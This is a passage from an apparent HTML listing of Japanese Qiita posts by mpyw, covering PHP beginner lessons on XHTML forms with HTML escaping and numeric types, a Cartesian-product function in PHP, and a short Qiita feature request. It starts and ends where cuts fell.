<span id="空要素タグには--が必要" class="fragment"></span><a href="#%E7%A9%BA%E8%A6%81%E7%B4%A0%E3%82%BF%E3%82%B0%E3%81%AB%E3%81%AF--%E3%81%8C%E5%BF%85%E8%A6%81"><i class="fa fa-link"></i></a>空要素タグには <code>/</code> が必要</h2>

<p>HTMLでは</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</pre></div></div>

<p>のようなタグは「開始タグのみを持つもの」として書いていましたが、XHTMLでは</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">hr</span> <span class="p">/&gt;</span>
</pre></div></div>

<p>とする必要があります。</p>

<h2>
<span id="meta-タグよりも-header-関数" class="fragment"></span><a href="#meta-%E3%82%BF%E3%82%B0%E3%82%88%E3%82%8A%E3%82%82-header-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a><code>meta</code> タグよりも <code>header</code> 関数</h2>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"Content-Type"</span> <span class="na">content</span><span class="o">=</span><span class="s">"text/html; charset=utf-8"</span><span class="p">&gt;</span>
</pre></div></div>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
</pre></div></div>

<p>といった記述は見慣れている方が多いと思いますが、metaタグは本来 <strong>「ブラウザに直接Content-Typeヘッダを送れないときのための補助手段」</strong> として存在するものであり、PHPを利用しているのであれば</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div></div>

<p>として直接ブラウザへの送信が可能となっているので、こちらを活用しましょう。HTMLのMIMEタイプは <code>text/html</code> でしたが、XHTMLでは <code>application/xhtml+xml</code> となります。 <strong><code>IE6</code> <code>IE7</code> <code>IE8</code> とかいう<del>糞ブラウザ</del>はXHTMLに対応していません</strong> が、<del>見捨てることにします</del>。</p>

<h2>
<span id="xmlns-属性が必須" class="fragment"></span><a href="#xmlns-%E5%B1%9E%E6%80%A7%E3%81%8C%E5%BF%85%E9%A0%88"><i class="fa fa-link"></i></a><code>xmlns</code> 属性が必須</h2>

<p>XHTMLでは決まり文句です。</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
</pre></div></div>

<h2>
<span id="form-要素直下にインライン要素を置いても良い" class="fragment"></span><a href="#form-%E8%A6%81%E7%B4%A0%E7%9B%B4%E4%B8%8B%E3%81%AB%E3%82%A4%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%B3%E8%A6%81%E7%B4%A0%E3%82%92%E7%BD%AE%E3%81%84%E3%81%A6%E3%82%82%E8%89%AF%E3%81%84"><i class="fa fa-link"></i></a><code>form</code> 要素直下にインライン要素を置いても良い</h2>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML4.01</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">"welcome.php"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>お名前： <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"my_name"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">XHTML1.0とXHTML1.1</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">"welcome.php"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>お名前： <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"my_name"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<p>従来は <code>form</code> タグの下にそのままインライン要素である <code>input</code> タグを置くことは禁止されていました。しかし、新しい規格では</p>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML5</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">"welcome.php"</span><span class="p">&gt;</span>
  お名前： <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"my_name"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">XHTML5</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">"welcome.php"</span><span class="p">&gt;</span>
  お名前： <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"my_name"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="p">/&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span> <span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>

<p>と書くことが認められています。もちろん従来通りの記述でも構いませんが。</p>

<h1>
<span id="welcomephp-の作成" class="fragment"></span><a href="#welcomephp-%E3%81%AE%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a><code>welcome.php</code> の作成</h1>

<p>次はリクエストを受け取って処理するページを作成してみます。テキストエディタで </p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Content-Typeヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello!!<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>こんにちは、<span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">])</span><span class="cp">?&gt;</span>さん！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<p>と入力した後、<code>welcome.php</code> としてルートディレクトリに保存してください。<br>
<code>http://localhost/form.php</code> から送信を行ってうまく動けば成功です。</p>

<h1>
<span id="リクエスト処理のポイント" class="fragment"></span><a href="#%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E5%87%A6%E7%90%86%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>リクエスト処理のポイント</h1>

<h2>
<span id="フォームに入力された内容を受け取る" class="fragment"></span><a href="#%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%AB%E5%85%A5%E5%8A%9B%E3%81%95%E3%82%8C%E3%81%9F%E5%86%85%E5%AE%B9%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8B"><i class="fa fa-link"></i></a>フォームに入力された内容を受け取る</h2>

<p>先ほどの例では <code>action</code> 属性は <strong><code>get</code></strong> 、<code>name</code> 属性は <strong><code>my_name</code></strong> として送信を行ったので、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">]</span>
</pre></div></div>

<p>というように受け取ります。 <code>action</code> 属性は <strong><code>get</code></strong> <strong><code>post</code></strong> の2種類があります。</p>

<table>
<thead>
<tr>
<th style="text-align: left"></th>
<th style="text-align: left"><strong><code>GET</code></strong></th>
<th style="text-align: left"><strong><code>POST</code></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">ブラウザ上から一目で確認出来るかどうか</td>
<td style="text-align: left">出来る</td>
<td style="text-align: left">出来ない</td>
</tr>
<tr>
<td style="text-align: left">(ブラウザ側が)情報をセットする場所</td>
<td style="text-align: left">URLの <code>?</code> より後ろの部分</td>
<td style="text-align: left">ポストフィールド</td>
</tr>
<tr>
<td style="text-align: left">(PHP側が)情報をセットする変数</td>
<td style="text-align: left"><strong><code>$_GET</code></strong></td>
<td style="text-align: left"><strong><code>$_POST</code></strong></td>
</tr>
</tbody>
</table>

<p>「スーパーグローバル変数」の項で詳しく触れますが、簡単に言えばこのような違いがあります。また、通常フォーム送信においては<ins> <code>GET</code> よりも <code>POST</code> の方がよく用いられます</ins>が、敢えてここでは後で説明したい問題があるがために <code>GET</code> を選択しました。</p>

<h2>
<span id="必ず-h-関数を通す" class="fragment"></span><a href="#%E5%BF%85%E3%81%9A-h-%E9%96%A2%E6%95%B0%E3%82%92%E9%80%9A%E3%81%99"><i class="fa fa-link"></i></a>必ず <code>h</code> 関数を通す</h2>

<p>必ず <code>h</code> 関数を通しましょう。<br>
必ず <code>h</code> 関数を通しましょう。<br>
必ず <code>h</code> 関数を通しましょう。</p>

<p>大事なことなので4回言いました。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />70位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>7</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/e0b6e0842a460b3f901f">PHPで直積計算</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-13 00:18:20</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[アルゴリズム]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="非再帰版" class="fragment"></span><a href="#%E9%9D%9E%E5%86%8D%E5%B8%B0%E7%89%88"><i class="fa fa-link"></i></a>非再帰版</h1>

<p>Pythonの実装を参考に非再帰版で書き直しました。なかなかこんな書き方思いつかないよ…</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">direct_product</span><span class="p">(</span><span class="k">array</span> <span class="o">...</span><span class="nv">$arrays</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="p">[[]];</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arrays</span> <span class="k">as</span> <span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$x</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$y</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span> <span class="p">[</span><span class="nv">$y</span><span class="p">]);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>

<span class="nb">var_export</span><span class="p">(</span><span class="nx">direct_product</span><span class="p">([</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">],</span> <span class="p">[</span><span class="s1">'a'</span><span class="p">],</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]));</span>
<span class="cm">/*</span>
<span class="cm">array (</span>
<span class="cm">  0 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'A',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 1,</span>
<span class="cm">  ),</span>
<span class="cm">  1 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'A',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 2,</span>
<span class="cm">  ),</span>
<span class="cm">  2 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'B',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 1,</span>
<span class="cm">  ),</span>
<span class="cm">  3 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'B',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 2,</span>
<span class="cm">  ),</span>
<span class="cm">  4 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'C',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 1,</span>
<span class="cm">  ),</span>
<span class="cm">  5 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'C',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 2,</span>
<span class="cm">  ),</span>
<span class="cm">)</span>
<span class="cm">*/</span>

<span class="nb">var_export</span><span class="p">(</span><span class="nx">direct_product</span><span class="p">([</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]));</span>
<span class="cm">/*</span>
<span class="cm">array (</span>
<span class="cm">)</span>
<span class="cm">*/</span>

<span class="nb">var_export</span><span class="p">(</span><span class="nx">direct_product</span><span class="p">());</span>
<span class="cm">/*</span>
<span class="cm">array (</span>
<span class="cm">  0 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">  ),</span>
<span class="cm">)</span>
<span class="cm">*/</span>
</pre></div></div>

<p>↑最後のやつって数学的に正しいのだろうか？</p>

<h1>
<span id="再帰ジェネレータ版" class="fragment"></span><a href="#%E5%86%8D%E5%B8%B0%E3%82%B8%E3%82%A7%E3%83%8D%E3%83%AC%E3%83%BC%E3%82%BF%E7%89%88"><i class="fa fa-link"></i></a>再帰ジェネレータ版</h1>

<p>一応こちらのほうが省メモリです。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">direct_product</span><span class="p">(</span><span class="k">array</span> <span class="o">...</span><span class="nv">$arrays</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$arrays</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">yield</span> <span class="p">[];</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$tails</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nv">$arrays</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nx">direct_product</span><span class="p">(</span><span class="o">...</span><span class="nv">$arrays</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$body</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tails</span> <span class="k">as</span> <span class="nv">$tail</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">yield</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$body</span><span class="p">,</span> <span class="p">[</span><span class="nv">$tail</span><span class="p">]);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nb">var_export</span><span class="p">(</span><span class="nb">iterator_to_array</span><span class="p">(</span><span class="nx">direct_product</span><span class="p">([</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">],</span> <span class="p">[</span><span class="s1">'a'</span><span class="p">],</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">])));</span>
<span class="cm">/*</span>
<span class="cm">array (</span>
<span class="cm">  0 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'A',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 1,</span>
<span class="cm">  ),</span>
<span class="cm">  1 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'A',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 2,</span>
<span class="cm">  ),</span>
<span class="cm">  2 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'B',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 1,</span>
<span class="cm">  ),</span>
<span class="cm">  3 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'B',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 2,</span>
<span class="cm">  ),</span>
<span class="cm">  4 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'C',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 1,</span>
<span class="cm">  ),</span>
<span class="cm">  5 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">    0 =&gt; 'C',</span>
<span class="cm">    1 =&gt; 'a',</span>
<span class="cm">    2 =&gt; 2,</span>
<span class="cm">  ),</span>
<span class="cm">)</span>
<span class="cm">*/</span>

<span class="nb">var_export</span><span class="p">(</span><span class="nb">iterator_to_array</span><span class="p">(</span><span class="nx">direct_product</span><span class="p">([</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">])));</span>
<span class="cm">/*</span>
<span class="cm">array (</span>
<span class="cm">)</span>
<span class="cm">*/</span>

<span class="nb">var_export</span><span class="p">(</span><span class="nb">iterator_to_array</span><span class="p">(</span><span class="nx">direct_product</span><span class="p">()));</span>
<span class="cm">/*</span>
<span class="cm">array (</span>
<span class="cm">  0 =&gt; </span>
<span class="cm">  array (</span>
<span class="cm">  ),</span>
<span class="cm">)</span>
<span class="cm">*/</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />71位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>5</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/074d428f4a4db9ba9783">ストックまわりの機能強化</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-25 14:42:40</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Qiita]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>なんかTwitterのふぁぼ感覚でストックしてたら収拾つかなくなってきたので、キーワード検索以外にも人気順ソートとかその他もろもろ高度な検索できると便利なんじゃないかと思った</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />72位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>5</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/346c535ade9dcf6e1b12">【PHP入門講座】 数値・論理値・リソース</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-29 21:38:23</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-e3ae0b3eaa387979610f">目次に戻る</a>
</h3>

<h1>
<span id="数値" class="fragment"></span><a href="#%E6%95%B0%E5%80%A4"><i class="fa fa-link"></i></a>数値</h1>

<p>数値は更に以下の2つがあります。</p>

<ul>
<li>整数(int, integer)</li>
<li>浮動小数点数(float, double)</li>
</ul>

<p>順番に見ていきましょう。</p>

<h2>
<span id="整数" class="fragment"></span><a href="#%E6%95%B4%E6%95%B0"><i class="fa fa-link"></i></a>整数</h2>

<ul>
<li>
<strong>int</strong> と <strong>integer</strong> は同じ意味ですが、前者の方がよく用いられます。大文字小文字の区別はありません。</li>
<li>実際には<ins>全て10進数として管理</ins>されますが、コード上では16進数・8進数・2進数(PHP5.4以降のみ)で表記することも出来ます。16進数では <code>0x</code> 、8進数では <code>0</code> 、2進数では <code>0b</code> を頭につけます。大文字小文字の区別はありません。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="mi">23</span><span class="p">);</span>      <span class="c1">// 10進数表記</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mh">0x17</span><span class="p">);</span>    <span class="c1">// 16進数表記</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mo">027</span><span class="p">);</span>     <span class="c1">// 8進数表記</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="mi">0</span><span class="nx">b10111</span><span class="p">);</span> <span class="c1">// 2進数表記(PHP5.4以降のみ)</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(23)
int(23)
int(23)
int(23)
</pre></div>
</div>

<ul>
<li>符号をつけることも出来ます。<code>23</code> と <code>+23</code> は同値です。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="o">+</span><span class="mi">23</span><span class="p">,</span> <span class="o">-</span><span class="mi">23</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>int(23)
int(-23)
</pre></div>
</div>

<ul>
<li>自分の環境での最大値は定数 <strong><code>PHP_INT_MAX</code></strong> によって自動的に定義されています。</li>
<li>具体的に扱える範囲は下記のようになります。</li>
</ul>

<table>
<thead>
<tr>
<th style="text-align: center"></th>
<th style="text-align: center">32ビット環境</th>
<th style="text-align: center">64ビット環境</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">最小値</td>
<td style="text-align: center">-2147483648</td>
<td style="text-align: center">-9223372036854775808</td>
</tr>
<tr>
<td style="text-align: center">最大値</td>
<td style="text-align: center">+2147483647</td>
<td style="text-align: center">+9223372036854775807</td>
</tr>
</tbody>
</table>

<ul>
<li>最小値を下回る・最大値を超える計算や整数以外の数と演算を行った、つまり<ins>整数でデータを維持出来なくなった</ins>とき、次に紹介する <strong>浮動小数点数</strong> に自動的に変換されます。</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nx">PHP_INT_MAX</span><span class="p">,</span> <span class="nx">PHP_INT_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">64ビット環境での実行結果</span></div>
<div class="highlight"><pre><span></span>int(9223372036854775807)
float(9223372036854775808)
</pre></div>
</div>

<h2>
<span id="浮動小数点数" class="fragment"></span><a href="#%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0"><i class="fa fa-link"></i></a>浮動小数点数</h2>

<h3>
<span id="浮動小数点数の予備知識" class="fragment"></span><a href="#%E6%B5%AE%E5%8B%95%E5%B0%8F%E6%95%B0%E7%82%B9%E6%95%B0%E3%81%AE%E4%BA%88%E5%82%99%E7%9F%A5%E8%AD%98"><i class="fa fa-link"></i></a>浮動小数点数の予備知識</h3>

<p>浮動小数点数はやや難解で、これが完璧に理解できなくてもPHPの学習にはほとんど差支えが無いので、ここでは<ins>ざっくりと</ins>解説します。正確な情報が欲しい方はWikipediaをお読みください。</p>

<p><strong>Wikipedia - 浮動小数点数</strong><br>
